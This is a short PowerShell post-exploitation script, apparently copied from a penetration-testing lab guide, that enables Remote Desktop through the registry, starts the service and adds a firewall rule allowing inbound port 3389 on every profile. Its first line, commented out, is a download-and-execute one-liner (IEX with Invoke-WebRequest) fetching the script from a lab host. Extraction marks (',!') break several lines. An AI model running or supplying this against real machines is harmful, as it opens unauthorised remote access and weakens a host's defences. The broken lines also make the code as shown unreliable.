#IEX (iwr -uri http://192.168.45.132/enable-rdp.ps1 -UseBasicParsing)
function Enable-RDP {
    # Enable RDP
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name
    ,! "fDenyTSConnections" -Value 0
    # Start the Remote Desktop Service
    Start-Service -Name TermService
    # Check if RDP port is open
    $RdpPort = 3389
    $IsPortOpen = Test-NetConnection -ComputerName localhost -Port $RdpPort | Select-Object
    ,! -ExpandProperty TcpTestSucceeded
    if ($IsPortOpen) {
    Write-Host "RDP Port $RdpPort is already open."
    } else {
    Write-Host "RDP Port $RdpPort is closed. Creating a Windows Firewall rule to open
    ,! it..."
    New-NetFirewallRule -Name "Allow RDP" -DisplayName "Allow RDP" -Enabled True
    ,! -Direction Inbound -Protocol TCP -Action Allow -Profile Any -LocalPort $RdpPort
    Write-Host "RDP Port $RdpPort has been opened in the Windows Firewall."
    }
    }
    # Call the function
    Enable-RDP